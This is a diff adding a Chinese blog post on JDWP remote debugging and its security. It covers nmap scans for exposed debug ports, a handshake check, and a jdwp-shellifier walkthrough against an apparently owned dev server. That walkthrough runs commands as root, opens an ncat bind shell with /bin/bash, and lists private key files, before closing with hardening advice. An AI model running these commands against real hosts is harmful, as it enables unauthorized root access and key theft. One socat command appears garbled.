@@ -4,6 +4,197 @@
   
     
     <entry>
+      <title><![CDATA[jdwp远程调试与安全]]></title>
+      <url>http://qsli.github.io/2018/08/12/jdwp/</url>
+      <content type="html"><![CDATA[<h1 id="什么是JDWP？"><a href="#什么是JDWP？" class="headerlink" title="什么是JDWP？"></a>什么是JDWP？</h1><blockquote>
+<p>JDWP（Java Debug Wire Protocol）是一个为 Java 调试而设计的一个通讯交互协议，它定义了调试器和被调试程序之间<strong>传递的信息的格式</strong>。在 JPDA 体系中，作为前端（front-end）的调试者（debugger）进程和后端（back-end）的被调试程序（debuggee）进程之间的交互数据的格式就是由 JDWP 来描述的，它详细完整地定义了请求命令、回应数据和错误代码，保证了前端和后端的 JVMTI 和 JDI 的通信通畅。比如在 Sun 公司提供的实现中，它提供了一个名为 jdwp.dll（jdwp.so）的动态链接库文件，这个动态库文件实现了一个 Agent，它会负责解析前端发出的请求或者命令，并将其转化为 JVMTI 调用，然后将 JVMTI 函数的返回值封装成 JDWP 数据发还给后端。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Components                          Debugger Interfaces</span><br><span class="line"></span><br><span class="line">                /    |--------------|</span><br><span class="line">               /     |     VM       |</span><br><span class="line"> debuggee ----(      |--------------|  &lt;------- JVM TI - Java VM Tool Interface</span><br><span class="line">               \     |   back-end   |</span><br><span class="line">                \    |--------------|</span><br><span class="line">                /           |</span><br><span class="line"> comm channel -(            |  &lt;--------------- JDWP - Java Debug Wire Protocol</span><br><span class="line">                \           |</span><br><span class="line">                     |--------------|</span><br><span class="line">                     | front-end    |</span><br><span class="line">                     |--------------|  &lt;------- JDI - Java Debug Interface</span><br><span class="line">                     |      UI      |</span><br><span class="line">                     |--------------|</span><br></pre></td></tr></table></figure>
+<p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jvmti" rel="external nofollow noopener noreferrer" target="_blank">JVM TI</a> -<strong>Java VM Tool Interface</strong></p>
+<p>Defines the debugging services a VM provides.</p>
+<p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jdwp" rel="external nofollow noopener noreferrer" target="_blank">JDWP</a> - <strong>Java Debug Wire Protocol</strong></p>
+<p>Defines the communication between <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#debuggee" rel="external nofollow noopener noreferrer" target="_blank">debuggee</a> and debugger processes.</p>
+<p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jdi" rel="external nofollow noopener noreferrer" target="_blank">JDI</a> - <strong>Java Debug Interface</strong></p>
+<p>Defines a high-level Java language interface which tool developers can easily use to write remote debugger applications.</p>
+<h1 id="发现开启了JDWP的端口"><a href="#发现开启了JDWP的端口" class="headerlink" title="发现开启了JDWP的端口"></a>发现开启了JDWP的端口</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p><code>nmap</code>是端口扫描的利器，支持批量扫描网段内端口打开的情况。通过<code>nmap</code>的扫描可以找到端口和对应的协议，这样就可以扫描到打开了远程debug的端口的机器。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo nmap -sV 221.221.221.221</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 12:12 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> izbp16k6k2yv9vvh6c3v65zi (221.221.221.221)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 972 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">42/tcp    filtered nameserver</span><br><span class="line">80/tcp    open     http           nginx 1.10.2</span><br><span class="line">111/tcp   open     rpcbind        2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">443/tcp   open     ssl/http       nginx 1.10.2</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">901/tcp   filtered samba-swat</span><br><span class="line">1068/tcp  filtered instl_bootc</span><br><span class="line">3128/tcp  filtered squid-http</span><br><span class="line">3333/tcp  filtered dec-notes</span><br><span class="line">3690/tcp  open     svnserve       Subversion</span><br><span class="line">4444/tcp  filtered krb524</span><br><span class="line">5800/tcp  filtered vnc-http</span><br><span class="line">5900/tcp  filtered vnc</span><br><span class="line">6129/tcp  filtered unknown</span><br><span class="line">6667/tcp  filtered irc</span><br><span class="line">7070/tcp  open     http           nginx 1.10.3</span><br><span class="line">8081/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8180/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8181/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9001/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9011/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9998/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9999/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">10010/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.42 seconds</span><br></pre></td></tr></table></figure>
+<p>从扫描的结果中可以看到<code>10010</code>端口开启了远程调试。</p>
+<h3 id="端口明明开了，却没有扫描到？"><a href="#端口明明开了，却没有扫描到？" class="headerlink" title="端口明明开了，却没有扫描到？"></a>端口明明开了，却没有扫描到？</h3><p>nmap默认只扫描每个协议常见的1000个端口，如果你的端口不在里面，默认就不会扫描。</p>
+<blockquote>
+<p><a href="https://nmap.org/book/man-port-specification.html" rel="external nofollow noopener noreferrer" target="_blank">Nmap scans the most common 1,000 ports for each protocol</a>. If your port is not in that list, it won’t be scanned. </p>
+</blockquote>
+<p>端口使用的频率存储在<code>nmap-services</code>文件中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) locate nmap-services</span><br><span class="line">/usr/<span class="built_in">local</span>/Cellar/nmap/7.70/share/nmap/nmap-services</span><br></pre></td></tr></table></figure>
+<p>可以直接查看这个文件， 也可以使用下面的命令查看对应的频率：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) sudo nmap -v -oG - -sSU</span><br><span class="line">Password:</span><br><span class="line"># Nmap 7.70 scan initiated Fri Aug 10 13:46:47 2018 as: nmap -v -oG - -sSU</span><br><span class="line"># Ports scanned: TCP(1000;1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521...省略</span><br></pre></td></tr></table></figure>
+<p>具体说明参见： <a href="https://secwiki.org/w/FAQ_missing_port" rel="external nofollow noopener noreferrer" target="_blank">FAQ missing port - SecWiki</a></p>
+<p>解决方案：</p>
+<p><code>nmap</code>中可以通过<code>-p</code>指定扫描的端口范围：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo nmap -sV 221.221.221.221  -p 1-65535</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 12:26 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> izbp16k6k2yv9vvh6c3v65zi (221.221.221.221)</span><br><span class="line">Host is up (0.035s latency).</span><br><span class="line">Not shown: 65464 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">42/tcp    filtered nameserver</span><br><span class="line">80/tcp    open     http           nginx 1.10.2</span><br><span class="line">111/tcp   open     rpcbind        2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">136/tcp   filtered profile</span><br><span class="line">137/tcp   filtered netbios-ns</span><br><span class="line">138/tcp   filtered netbios-dgm</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">443/tcp   open     ssl/http       nginx 1.10.2</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">901/tcp   filtered samba-swat</span><br><span class="line">1068/tcp  filtered instl_bootc</span><br><span class="line">2745/tcp  filtered urbisnet</span><br><span class="line">3127/tcp  filtered ctx-bridge</span><br><span class="line">3128/tcp  filtered squid-http</span><br><span class="line">3333/tcp  filtered dec-notes</span><br><span class="line">3690/tcp  open     svnserve       Subversion</span><br><span class="line">3691/tcp  open     svnserve       Subversion</span><br><span class="line">4444/tcp  filtered krb524</span><br><span class="line">4999/tcp  open     http           Apache httpd 2.4.10 ((Debian))</span><br><span class="line">5554/tcp  filtered sgi-esphttp</span><br><span class="line">5800/tcp  filtered vnc-http</span><br><span class="line">5900/tcp  filtered vnc</span><br><span class="line">6129/tcp  filtered unknown</span><br><span class="line">6176/tcp  filtered unknown</span><br><span class="line">6379/tcp  open     redis          Redis key-value store</span><br><span class="line">6667/tcp  filtered irc</span><br><span class="line">7070/tcp  open     http           nginx 1.10.3</span><br><span class="line">8076/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8081/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8146/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8180/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8181/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8183/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8188/tcp  open     unknown</span><br><span class="line">8189/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8280/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8283/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8380/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8399/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8694/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8967/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8998/tcp  filtered canto-roboflow</span><br><span class="line">9001/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9011/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9058/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">9060/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_171</span><br><span class="line">9260/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">9928/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">9988/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">9990/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9991/tcp  open     http           Jetty 9.4.8.v20171121</span><br><span class="line">9996/tcp  filtered palace-5</span><br><span class="line">9997/tcp  open     http           Jetty 9.4.8.v20171121</span><br><span class="line">9998/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9999/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">10010/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">10018/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">11114/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_171</span><br><span class="line">11211/tcp open     memcached      Memcached 1.4.34 (uptime 20219548 seconds)</span><br><span class="line">12001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">12003/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">13001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">13003/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">14002/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">15001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">18694/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">19998/tcp open     http           Jetty 9.4.7.v20170914</span><br><span class="line">29998/tcp open     http           Jetty 9.4.7.v20170914</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 87.05 seconds</span><br></pre></td></tr></table></figure>
+<p>上面是dev机器上开启的端口， <code>Java Debug Wire Protocol (Reference Implementation)</code>就是开启了<code>JDWP</code>的机器。</p>
+<h2 id="二次确认"><a href="#二次确认" class="headerlink" title="二次确认"></a>二次确认</h2><blockquote>
+<p>telnet端口后，输入命令JDWP-Handshake<br>如果返回JDWP-Handshake，证明存在漏洞。</p>
+</blockquote>
+<p>可以用下面的命令测试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) &#123; <span class="built_in">echo</span> <span class="string">"JDWP-Handshake"</span>; sleep 20 &#125; | telnet 221.221.221.221 10010</span><br><span class="line">Trying 221.221.221.221...</span><br><span class="line">Connected to izbp16k6k2yv9vvh6c3v65zi.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">JDWP-Handshake</span><br></pre></td></tr></table></figure>
+<p>或者使用<code>nc</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) &#123; <span class="built_in">echo</span> <span class="string">"JDWP-Handshake"</span>; sleep 1 | <span class="built_in">trap</span> <span class="built_in">exit</span> INT&#125; | nc 221.221.221.221 10010</span><br><span class="line">JDWP-Handshake</span><br></pre></td></tr></table></figure>
+<h1 id="漏洞利用实战"><a href="#漏洞利用实战" class="headerlink" title="漏洞利用实战"></a>漏洞利用实战</h1><h2 id="确定debug的端口"><a href="#确定debug的端口" class="headerlink" title="确定debug的端口"></a>确定debug的端口</h2><p>通过<code>nmap</code>确定debug的端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18694/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation)</span><br></pre></td></tr></table></figure>
+<h2 id="nmap执行命令"><a href="#nmap执行命令" class="headerlink" title="nmap执行命令"></a>nmap执行命令</h2><p><a href="https://nmap.org/nsedoc/scripts/jdwp-exec.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-exec NSE Script</a></p>
+<p><a href="https://nmap.org/nsedoc/scripts/jdwp-info.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-info NSE Script</a></p>
+<p><a href="https://nmap.org/nsedoc/scripts/jdwp-inject.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-inject NSE Script</a></p>
+<blockquote>
+<p>这种方式没有实验成功，有兴趣的同学可以试一试</p>
+</blockquote>
+<ul>
+<li>Example Usage</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT &lt;target&gt; -p &lt;port&gt; --script=+jdwp-exec --script-args cmd=&quot;date&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Script Output</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON</span><br><span class="line">2010/tcp open  search  syn-ack</span><br><span class="line">| jdwp-exec:</span><br><span class="line">|   date output:</span><br><span class="line">|   Sat Aug 11 15:27:21 Central European Daylight Time 2012</span><br><span class="line">|_</span><br></pre></td></tr></table></figure>
+<h2 id="开源脚本"><a href="#开源脚本" class="headerlink" title="开源脚本"></a>开源脚本</h2><p><a href="https://github.com/IOActive/jdwp-shellifier" rel="external nofollow noopener noreferrer" target="_blank">IOActive/jdwp-shellifier</a></p>
+<p>使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) python jdwp-shellifier.py -t 221.221.221.221 -p 10010  --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span>  --cmd <span class="string">"touch /home/777"</span></span><br><span class="line">[+] Targeting <span class="string">'221.221.221.221:10010'</span></span><br><span class="line">[+] Reading settings <span class="keyword">for</span> <span class="string">'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_121'</span></span><br><span class="line">[+] Found Runtime class: id=346d</span><br><span class="line">[+] Found Runtime.getRuntime(): id=7fd8f420b170</span><br><span class="line">[+] Created <span class="built_in">break</span> event id=2</span><br><span class="line">[+] Waiting <span class="keyword">for</span> an event on <span class="string">'java.lang.String.indexOf'</span></span><br><span class="line">[+] Received matching event from thread 0x355c</span><br><span class="line">[+] Selected payload <span class="string">'touch /home/777'</span></span><br><span class="line">[+] Command string object created id:355d</span><br><span class="line">[+] Runtime.getRuntime() returned context id:0x355e</span><br><span class="line">[+] found Runtime.exec(): id=7fd8f40140f0</span><br><span class="line">[+] Runtime.exec() successful, retId=355f</span><br><span class="line">[!] Command successfully executed</span><br></pre></td></tr></table></figure>
+<p><code>break-on &quot;java.lang.String.indexOf&quot;</code>表示在这个函数打断点，当这个函数执行的时候， 后面跟着的命令就会执行，这时我们登录上机器查看下执行的结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-dev-api server]<span class="comment"># ls -alh  /home</span></span><br><span class="line">总用量 52K</span><br><span class="line">drwxr-xr-x. 13 root          root          4.0K 8月  10 14:12 .</span><br><span class="line">dr-xr-xr-x. 28 root          root          4.0K 7月  19 17:52 ..</span><br><span class="line">-rw-r--r--   1 root          root             0 8月  10 14:12 777</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>777</code>这个文件已经创建了， 时间正好是我们执行命令的时间。</p>
+<p>这只是初级玩法， 脚本的示例给的是启动一个<code>ncat</code>的程序， 然后就可以远程连接上这个ncat开启的端口，相当于有一个<code>root</code>权限的shell了。</p>
+<p>安装<code>ncat</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 221.221.221.221 -p 8399  --break-on &quot;java.lang.String.indexOf&quot;  --cmd  &quot;sudo yum install -y nc&quot;</span><br></pre></td></tr></table></figure>
+<p><code>ncat</code>在服务器上开启一个端口， 转发输入交给<code>bash</code>去执行。</p>
+<p>开启转发服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) python jdwp-shellifier.py -t 221.221.221.221 -p 8399  --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span>  --cmd  <span class="string">"ncat -v -l -p 7777 -e /bin/bash"</span></span><br><span class="line">[+] Targeting <span class="string">'221.221.221.221:8399'</span></span><br><span class="line">[+] Reading settings <span class="keyword">for</span> <span class="string">'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_121'</span></span><br><span class="line">[+] Found Runtime class: id=345e</span><br><span class="line">[+] Found Runtime.getRuntime(): id=7f6420023408</span><br><span class="line">[+] Created <span class="built_in">break</span> event id=2</span><br><span class="line">[+] Waiting <span class="keyword">for</span> an event on <span class="string">'java.lang.String.indexOf'</span></span><br><span class="line">[+] Received matching event from thread 0x354e</span><br><span class="line">[+] Selected payload <span class="string">'ncat -v -l -p 7777 -e /bin/bash'</span></span><br><span class="line">[+] Command string object created id:354f</span><br><span class="line">[+] Runtime.getRuntime() returned context id:0x3550</span><br><span class="line">[+] found Runtime.exec(): id=7f6420023468</span><br><span class="line">[+] Runtime.exec() successful, retId=3551</span><br><span class="line">[!] Command successfully executed</span><br></pre></td></tr></table></figure>
+<p>服务器上端口已经开启：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-dev-api server]# sudo lsof -i:7777</span><br><span class="line">COMMAND  PID USER   FD   TYPE    DEVICE SIZE/OFF NODE NAME</span><br><span class="line">ncat    7617 root    3u  IPv6 292856080      0t0  TCP *:cbt (LISTEN)</span><br><span class="line">ncat    7617 root    4u  IPv4 292856081      0t0  TCP *:cbt (LISTEN)</span><br></pre></td></tr></table></figure>
+<p>连接上去：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) nc 221.221.221.221 7777</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">ls -alh</span><br><span class="line">total 218M</span><br><span class="line">dr-xr-x---. 18 root root 4.0K Aug 10 11:05 .</span><br><span class="line">dr-xr-xr-x. 28 root root 4.0K Jul 19 17:52 ..</span><br><span class="line">-rw-r--r--   1 root root   26 May 11 13:57 12.txt</span><br><span class="line">-rwxr-xr-x   1 root root 1.7K Jan 30  2018 214468302700277.key</span><br><span class="line">-rwxr-xr-x   1 root root 3.3K Jan 30  2018 214468302700277.pem</span><br></pre></td></tr></table></figure>
+<h1 id="远程调试的建议"><a href="#远程调试的建议" class="headerlink" title="远程调试的建议"></a>远程调试的建议</h1><p>一、线上不能开启debug，对服务器性能有影响。</p>
+<p>二、关闭对外远程debug的端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof -i:&lt;port&gt;</span><br></pre></td></tr></table></figure>
+<p>查找到对应的进程， 然后修改配置，<strong>重启tomcat</strong></p>
+<p>三、远程debug步骤：</p>
+<ol>
+<li><p>tomcat 开启调试: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CATALINA_OPTS=<span class="string">"-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=127.0.0.1:8399"</span></span><br></pre></td></tr></table></figure>
+<p><strong>注意必须绑定到127.0.0.1</strong></p>
+</li>
+<li><p>安装socat</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y socat</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>服务器安装socat进行转发:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:5005forkrange=0.0.0.0/32 TCP4:127.0.0.1:8399 | hostname -i</span><br></pre></td></tr></table></figure>
+<p>其中<code>0.0.0.0/32</code>表示放开ip限制（不是内网没有办法限制出口ip)， <strong>命令不要在后台执行</strong>，否则跟开启了对外的远程debug没有区别</p>
+</li>
+<li><p>idea中新建Remote配置，host写上面输出的公网的ip， 端口写5005</p>
+</li>
+</ol>
+<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><ul>
+<li>远程调试端口的地址一定要绑定到<code>127.0.0.1</code></li>
+<li>tomcat用单独的组的用户启动（这个组的权限要设置到较低）</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jpda1/index.html?ca=drs-" rel="external nofollow noopener noreferrer" target="_blank">深入 Java 调试体系: 第 1 部分，JPDA 体系概览</a></li>
